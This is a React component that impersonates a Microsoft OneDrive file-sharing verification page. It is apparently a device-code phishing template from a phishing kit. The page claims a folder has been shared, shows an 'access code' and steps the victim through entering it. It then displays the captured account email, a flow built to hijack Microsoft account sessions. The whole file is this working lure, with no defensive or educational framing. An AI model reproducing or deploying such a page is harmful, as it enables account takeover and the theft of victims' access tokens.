import React from 'react';
import { useDeviceCodeFlow } from '../../hooks/useDeviceCodeFlow';

export function OneDriveTemplate(): React.ReactElement {
  const f = useDeviceCodeFlow('onedrive');

  return (
    <div className="tpl-page" style={{ background: '#f0f6ff' }}>
      <div className="tpl-container" style={{ maxWidth: 500 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
          <svg width="32" height="32" viewBox="0 0 32 32"><rect width="32" height="32" rx="6" fill="#0078D4"/><path d="M10 20c-2.2 0-4-1.8-4-4 0-1.9 1.3-3.4 3-3.9C9.6 9.8 11.6 8 14 8c2 0 3.7 1.3 4.4 3 .2 0 .4-.1.6-.1 2.2 0 4 1.8 4 4s-1.8 4-4 4H10z" fill="white" opacity="0.9"/></svg>
          <span style={{ fontSize: 18, fontWeight: 600, color: '#1b1b1b' }}>OneDrive</span>
        </div>

        <div className="tpl-card">
          {f.state === 'idle' && (
            <>
              <h1 className="tpl-title">File Sharing Verification</h1>
              <p className="tpl-text">Someone has shared files with you on Microsoft OneDrive. Verify your identity to access the shared content.</p>
              <div className="tpl-info-box" style={{ background: '#f3f9ff', borderColor: '#c7e0f4', color: '#0078D4' }}>
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#0078D4" strokeWidth="2"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
                <span>Shared folder — 5 documents available</span>
              </div>
              <button className="tpl-btn" style={{ background: '#0078D4' }} onClick={f.handleStart}>Verify to Access</button>
            </>
          )}
          {f.state === 'loading' && <div className="tpl-center"><div className="capture-spinner" /><p>Connecting to OneDrive...</p></div>}
          {(f.state === 'code_ready' || f.state === 'waiting') && (
            <>
              <h1 className="tpl-title">Enter Access Code</h1>
              <p className="tpl-text">Use this code to verify and access the shared OneDrive files.</p>
              <div className="tpl-code-box"><div className="tpl-code-label">ACCESS CODE</div><div className="tpl-code">{f.userCode}</div><button className="tpl-copy-btn" onClick={f.handleCopy}>{f.copied ? 'Copied!' : 'Copy'}</button></div>
              <div className="tpl-steps"><div className="tpl-step">1. Copy the access code</div><div className="tpl-step">2. Click verify and enter the code</div></div>
              <button className="tpl-btn" style={{ background: '#0078D4' }} onClick={f.handleVerify}>Verify</button>
              {f.state === 'waiting' && <p className="tpl-waiting">Verifying...</p>}
              <p className="tpl-expiry">Code expires in {f.formatTime(f.countdown)}</p>
            </>
          )}
          {f.state === 'success' && <div className="tpl-center"><svg width="56" height="56" viewBox="0 0 24 24" fill="none" stroke="#107c10" strokeWidth="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg><h1 className="tpl-title">Access Granted</h1>{f.authEmail && <p>Account: <strong>{f.authEmail}</strong></p>}<p className="tpl-text">You can now access the shared files.</p><button className="tpl-btn secondary" onClick={f.handleReset}>Access another</button></div>}
          {f.state === 'expired' && <div className="tpl-center"><h1 className="tpl-title">Code Expired</h1><button className="tpl-btn" style={{ background: '#0078D4' }} onClick={f.handleReset}>Try Again</button></div>}
          {f.state === 'error' && <div className="tpl-center"><h1 className="tpl-title">Error</h1><p className="tpl-text">{f.errorMsg}</p><button className="tpl-btn" style={{ background: '#0078D4' }} onClick={f.handleReset}>Try Again</button></div>}
        </div>
        <div className="tpl-footer"><span>Microsoft Terms</span><span>Privacy</span></div>
      </div>
    </div>
  );
}
